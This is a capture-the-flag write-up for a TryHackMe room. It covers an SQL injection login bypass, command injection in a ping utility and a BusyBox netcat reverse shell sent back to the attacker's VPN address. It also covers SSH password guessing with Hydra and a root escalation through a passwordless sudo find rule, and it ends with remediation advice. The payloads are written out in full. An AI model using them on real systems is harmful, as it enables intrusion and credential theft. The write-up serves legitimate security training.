# Operation Promotion Challenge  
*[Image: Banner]*

**Pathway:** *Jr Penetration Tester* | **Section:** *Jr Pentester Challenges* | **Challenge:** *[Operation Promotion](https://tryhackme.com/room/operationpromotion)*

> [!IMPORTANT]
>
> **Spoiler warning:** This writeup contains part of the exploitation chain, however no flag codes are shown in this write-up!
>
> **Please note:** The IP addresses shown in this writeup were allocated during the TryHackMe lab, with the attack performed from my own Kali Linux VM using OpenVPN connected to the TryHackMe VPN.
>
> The following placeholders are used throughout this writeup:
>
>: `<TARGET_IP>` represents the IP address allocated to the target host when the room was started.
>: `<TUN0_IP>` represents the IP address allocated to my Kali Linux `tun0` interface while connected to the TryHackMe VPN.
>: `<REDACTED>` represents credentials, passwords, sensitive file contents, exact exploit values or anything else that would directly give away the challenge.
>: `THM{....}` represents a redacted TryHackMe flag.
>
> **License:** Unless otherwise stated, all write-ups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).

## About TryHackMe

This write-up was made possible by the hard work of the TryHackMe team and the wider cyber security community, who continue to create practical and engaging learning environments for aspiring security professionals.

[TryHackMe](https://tryhackme.com/) is an online cyber security training platform that provides hands-on labs covering penetration testing, networking, web application security, privilege escalation and defensive security. Its rooms allow learners to develop practical technical skills within controlled and authorised environments.

## Lab Summary

Operation Promotion is a multi-stage penetration-testing challenge built around a fictional recruitment company and its public-facing portal. The objective was to compromise the host, obtain an initial user flag and escalate privileges to recover the final root-level flag.

The successful attack chain involved:

1. Confirming VPN routing and local hostname resolution.
2. Enumerating exposed SSH, HTTP and SMB services.
3. Discovering the administrative portal through `robots.txt` and directory enumeration.
4. Bypassing the administrator login with SQL injection.
5. Querying an authenticated user lookup function for an internal maintenance endpoint.
6. Exploiting command injection in a web-based ping utility.
7. Receiving a reverse shell as the web service account.
8. Locating an application configuration file containing a bcrypt password hash.
9. Building a targeted password mutation list and validating SSH credentials.
10. Logging in over SSH as a local user and reading `user.txt`.
11. Identifying an unsafe passwordless `sudo` rule for `/usr/bin/find`.
12. Using the permitted binary to spawn a root shell and read `flag.txt`.

Confirmed lab details used during the walkthrough:

```text
Target IP: <TARGET_IP>
Kali tun0 IP: <TUN0_IP>
Attacker working directory: /tmp/VK/
Local hostname: operation-promotion.thm
```

The target IP address was added to the local hosts file so the hostname resolved correctly from the Kali VM:

```bash
echo "<TARGET_IP> operation-promotion.thm" | sudo tee -a /etc/hosts
```

The mapping was confirmed using:

```bash
getent hosts operation-promotion.thm
```

The VPN route and local tunnel interface were also checked:

```bash
ip route get <TARGET_IP>
ip -br address show tun0
```

The expected result showed traffic leaving through `tun0` and using the assigned VPN address:

```text
<TARGET_IP> via <REDACTED> dev tun0 src <TUN0_IP>
```

This confirmed that traffic to the target was routed through `tun0` using `<TUN0_IP>`.

> [!TIP]
>
> When using your own Kali VM, the `/etc/hosts` file is especially important in these TryHackMe challenges. Many rooms rely on hostname-based routing, virtual hosts, redirects, cookies or application logic that will not behave correctly if the hostname is missing.
>
> Over time, `/etc/hosts` can become cluttered with old lab entries, so it is advantageous to keep it clear, tidy and focused on the challenge currently being worked on.
>
> A messy hosts file is basically DNS spaghetti: technically edible, but nobody sensible wants it.

The file can be reviewed using:

```bash
cat /etc/hosts
```

An old challenge entry can be removed with:

```bash
sudo sed -i '/operation-promotion\.thm/d' /etc/hosts
```

The correct entry can then be added again using the currently allocated `<TARGET_IP>`.

## Tools Used

The principal tools and utilities used were:

* `ip` for confirming VPN routing and the `tun0` address.
* `getent` for validating local hostname resolution.
* `rustscan` and `nmap` for TCP port, service and script enumeration.
* `gobuster`, `dirsearch` and `feroxbuster` for web content discovery.
* Firefox for interacting with the web application.
* `nxc` and `impacket-smbclient` for SMB enumeration.
* `nc` for the reverse-shell listener.
* Python 3 for upgrading the basic shell to a pseudo-terminal.
* `find`, `cat` and other standard Linux utilities for local enumeration.
* Hashcat's rule engine for generating a focused password mutation list.
* Hydra and NetExec for validating SSH credentials.
* OpenSSH for obtaining a stable interactive user session.

Click [HERE](https://github.com/Valikahn/TryHackMe-Jr-Penetration-Tester#tools-commonly-used) to return to the repository README. The `Tools Commonly Used` section contains links to tools used throughout the pathway.

## Initial Enumeration

### Port and Service Discovery

A fast initial scan identified the exposed ports:

```bash
rustscan -b 500 -a operation-promotion.thm --top -- -sC -sV -Pn
```

A full TCP scan was then used to confirm that no additional services were exposed:

```bash
nmap -Pn -p- -sC -sV --min-rate 2000 operation-promotion.thm
```

The principal findings were:

```text
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  netbios-ssn
```

The HTTP service was Apache on Ubuntu, while ports 139 and 445 exposed Samba. The Nmap HTTP scripts also reported a disallowed administrative path in `robots.txt`.

### SMB Enumeration

Guest access was tested with NetExec:

```bash
nxc smb operation-promotion.thm -u guest -p '' --shares
```

The server accepted guest authentication and exposed a read-only share:

```text
public   READ
IPC$
```

The share was inspected with Impacket:

```bash
impacket-smbclient guest:''@operation-promotion.thm
```

Inside the client:

```text
shares
use public
ls
get README.txt
exit
```

The downloaded file contained only a short internal notice and did not directly advance the attack. This was still useful because it confirmed that anonymous SMB access was enabled and that no obvious credentials or deployment files were present in the share.

### Web Content Discovery

The root web application was enumerated with Gobuster:

```bash
gobuster dir \
  -u http://operation-promotion.thm/ \
  -w /usr/share/wordlists/dirb/big.txt
```

The important result was:

```text
/admin/
```

Further enumeration against the administrative path identified an additional users directory:

```bash
gobuster dir \
  -u http://operation-promotion.thm/admin/ \
  -w /usr/share/wordlists/dirb/big.txt
```

Additional scans with `dirsearch` and `feroxbuster` confirmed the principal PHP endpoints and showed that the `/admin/users/` directory allowed directory listing.

The exposed content included:

```text
/admin/
/admin/index.php
/admin/dashboard.php
/admin/logout.php
/admin/users/
```

## Exploits

### SQL Injection Authentication Bypass

The administrator login accepted an SQL injection payload in the username field. The following values were submitted through the browser:

```text
Username: admin' --
Password: <REDACTED>
```

The single quote terminated the original username value and the comment sequence caused the remainder of the SQL statement to be ignored.

Successful exploitation redirected the browser to the administrative dashboard and displayed an authenticated session for the administrator account.

This confirmed that the application was constructing its login query from unsanitised user input rather than using a prepared statement.

### Authenticated User Lookup Enumeration

The dashboard contained a user lookup function based on a numeric user ID.

A specific record returned a maintenance-related account and an internal note. The identifying account details and lookup value have been redacted:

```text
User ID: <REDACTED>
Username: <REDACTED>
Role: <REDACTED>
Notes: internal maintenance endpoint at /admin/sysmaint-checks/ping.php
```

This information disclosure exposed a system administration utility that was not discovered during unauthenticated directory enumeration.

### Command Injection in the Ping Utility

Opening the maintenance endpoint returned a usage message:

```text
Usage: /admin/sysmaint-checks/ping.php?host=<target>
```

A harmless command-injection test was performed by appending an encoded semicolon and the `id` command:

```text
http://operation-promotion.thm/admin/sysmaint-checks/ping.php?host=127.0.0.1%3Bid
```

The response contained normal ping output followed by:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirmed operating-system command execution as the Apache service account.

### Reverse Shell

A listener was started on the Kali VM:

```bash
nc -lvnp 4444
```

The vulnerable parameter was then used to invoke BusyBox Netcat and connect back to the VPN interface:

```text
http://operation-promotion.thm/admin/sysmaint-checks/ping.php?host=127.0.0.1%3Bbusybox%20nc%20<TUN0_IP>%204444%20-e%20/bin/bash
```

The listener received a connection from `<TARGET_IP>`, providing a shell as `www-data`.

Basic validation commands confirmed the context:

```bash
whoami
pwd
id
hostname
```

### Shell Upgrade

The initial shell was upgraded with Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This provided a more usable Bash prompt for local enumeration.

### Web Application Configuration Discovery

The web root was searched for files:

```bash
find /var/www/html -maxdepth 4 -type f -printf '%p\n'
```

A configuration file was discovered:

```text
/var/www/html/config/db.conf
```

Its contents were reviewed:

```bash
cat /var/www/html/config/db.conf
```

The file disclosed:

```text
db_host=localhost
db_name=<REDACTED>
db_user=<REDACTED>
db_pass_hash=<REDACTED>
db_engine=sqlite3
```

The password itself was not stored in plaintext, but the bcrypt hash provided a route to offline password analysis.

### Targeted Password Mutation Strategy

Instead of testing the entire RockYou wordlist against a deliberately slow bcrypt hash, a focused candidate was selected from contextual clues and expanded with Hashcat's `dive.rule`.

The base candidate is redacted:

```bash
echo "<REDACTED>" > jfordpassword.txt
```

A mutation list was generated:

```bash
hashcat --stdout jfordpassword.txt \
  -r /usr/share/hashcat/rules/dive.rule \
  > jfordpasslist.txt
```

This produced a much smaller and more context-aware list than a broad generic dictionary.

SSH authentication was then tested:

```bash
hydra -l <REDACTED> \
  -P jfordpasslist.txt \
  operation-promotion.thm ssh
```

Hydra identified a valid username and password combination:

```text
login: <REDACTED>
password: <REDACTED>
```

The credentials were independently confirmed with NetExec:

```bash
nxc ssh operation-promotion.thm \
  -u <REDACTED> \
  -p '<REDACTED>'
```

The successful result confirmed interactive shell access.

### SSH Access and User Flag

A stable session was opened:

```bash
ssh <REDACTED>@operation-promotion.thm
```

The user flag was read from the home directory:

```bash
cat ~/user.txt
```

The result is intentionally redacted:

```text
THM{....}
```

### Sudo Enumeration

The local user's sudo privileges were reviewed:

```bash
sudo -l
```

The output showed that the account could run the following binary as root without entering a password:

```text
(root) NOPASSWD: /usr/bin/find
```

This was a critical privilege-escalation weakness because GNU `find` supports command execution through `-exec`.

### Privilege Escalation Through `find`

The permitted binary was used to launch Bash as root:

```bash
sudo /usr/bin/find . -exec /bin/bash \; -quit
```

The shell prompt changed to:

```text
root@recruitcorp:/home/<REDACTED>#
```

The effective identity could be verified with:

```bash
id
```

The final flag was then read:

```bash
cat /root/flag.txt
```

The result is intentionally redacted:

```text
THM{....}
```

## Full Attack Chain Recap

### 1. VPN and hostname preparation
The target route and `tun0` address were verified before scanning. The room hostname was mapped in `/etc/hosts`, allowing the web application to be addressed through its expected virtual-host name.

### 2. Service discovery
RustScan and Nmap identified SSH, Apache HTTP and Samba services. No additional TCP services were found during the full-port scan.

### 3. SMB review
Guest SMB authentication exposed a readable public share. Its contents did not reveal credentials, but the result confirmed an unnecessary anonymous service exposure.

### 4. Web enumeration
`robots.txt`, Gobuster, Dirsearch and Feroxbuster identified the administrator portal, PHP endpoints and the users directory.

### 5. SQL injection
An authentication-bypass payload manipulated the administrator login query and created an authenticated admin session.

### 6. Information disclosure
The authenticated user lookup function exposed an internal note that identified the maintenance ping utility.

### 7. Command injection
The ping utility passed the `host` parameter to a shell command without adequate validation. Injecting `;id` confirmed remote command execution as `www-data`.

### 8. Reverse shell
BusyBox Netcat was invoked through the vulnerable parameter and connected back to `<TUN0_IP>`, providing an interactive foothold on `<TARGET_IP>`.

### 9. Credential material discovery
Local file enumeration revealed a web application configuration file containing a username and bcrypt password hash.

### 10. Focused password recovery
A small, contextual candidate list was expanded with Hashcat rules. Hydra identified a valid SSH password significantly faster than a full generic wordlist attack would have taken.

### 11. User access
The recovered credentials provided SSH access to the host. The local user's `user.txt` contained the first flag:

```text
THM{....}
```

### 12. Root privilege escalation
`sudo -l` exposed a passwordless rule for `/usr/bin/find`. Its `-exec` capability was used to start `/bin/bash` as root.

### 13. Final objective
The root shell provided access to `/root/flag.txt`, completing the room:

```text
THM{....}
```

## Key Lessons

This challenge demonstrated several important penetration-testing and defensive-security lessons:

- Confirm VPN routing and name resolution before troubleshooting higher-level services.
- Hostname-based TryHackMe applications may not function correctly unless `/etc/hosts` is configured.
- Stale `/etc/hosts` entries should be removed to avoid conflicts between rooms.
- Anonymous SMB access should be reviewed even when the exposed files initially appear unimportant.
- `robots.txt` is not an access-control mechanism and frequently reveals sensitive paths.
- Directory enumeration should be performed both at the web root and beneath newly discovered directories.
- SQL injection in an authentication flow can provide immediate administrative access.
- Authenticated functionality may disclose attack paths that are not reachable or visible anonymously.
- Passing user-controlled input to operating-system commands creates a direct route to command injection.
- Application configuration files should be treated as sensitive even when passwords are hashed.
- Contextual password mutation can be considerably more efficient than blindly testing a very large dictionary.
- Recovered credentials should be validated carefully and then used through the most stable available service.
- `sudo -l` should be checked immediately after obtaining an interactive local account.
- Allowing `find` through passwordless sudo is equivalent to granting root command execution.
- Each stage should be validated independently before moving further through the attack chain.

The most useful operational lesson was to avoid overcommitting to one enumeration route. SMB was exposed but did not provide the initial foothold. The web application provided the actual chain, while local configuration review and sudo enumeration completed the compromise.

## Remediation Notes

The vulnerabilities demonstrated in this lab could be mitigated through the following controls.

### Web Application Security

- Replace dynamically constructed SQL queries with prepared statements and parameterised queries.
- Validate authentication input on the server rather than relying on browser-side controls.
- Apply consistent error handling so failed queries do not disclose backend behaviour.
- Enforce strong session management after successful authentication.
- Apply authorisation checks to every administrative function, not merely the dashboard landing page.
- Remove internal operational notes from user-facing records.
- Avoid exposing maintenance utilities through the production web root.

### Command Execution Controls

- Never concatenate user-controlled values into shell commands.
- Replace shell-based ping execution with a safe library or a tightly constrained system call.
- Validate host values against a strict allow-list of IPv4, IPv6 or approved hostname formats.
- Use argument arrays rather than invoking a shell interpreter.
- Run web services under a dedicated, low-privilege account with minimal file access.
- Restrict outbound connections from the web server where they are not operationally required.

### Credential and Secret Management

- Do not store password hashes or service credentials in files readable by the web service account.
- Store secrets outside the public web root with restrictive ownership and permissions.
- Use a dedicated secrets-management system where practical.
- Prevent password reuse between application, system and remote-access accounts.
- Enforce long, unique passwords and multi-factor authentication for administrative access.
- Monitor for repeated SSH authentication attempts and rule-based password spraying.

### SMB Hardening

- Disable guest access unless it is explicitly required.
- Remove world-readable and world-writable share permissions.
- Restrict SMB exposure to trusted networks.
- Enable signing where supported and review Samba configuration regularly.

### Privilege Management

- Remove the passwordless `sudo` rule for `/usr/bin/find`.
- Grant sudo access only to purpose-built commands with fixed arguments.
- Avoid permitting interpreters, editors, archivers or utilities that support command execution.
- Use wrapper scripts with strict input validation when limited administrative functions are required.
- Regularly audit `/etc/sudoers` and files beneath `/etc/sudoers.d/`.
- Monitor privileged process creation and unusual root shells.

### Operational Hygiene

- Keep `/etc/hosts` on the attack VM clear and limited to active lab mappings.
- Remove obsolete room entries after completing each challenge.
- Maintain accurate notes of target hostnames, IP addresses and VPN interface addresses.
- Separate evidence, generated wordlists and scan output into a dedicated working directory for each engagement.

## Disclaimer

This write-up is intended solely for education, training and documentation of an authorised TryHackMe lab.

All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.

The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.

Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.

---
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  

**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
⭐ If this project is useful, consider starring it on GitHub.
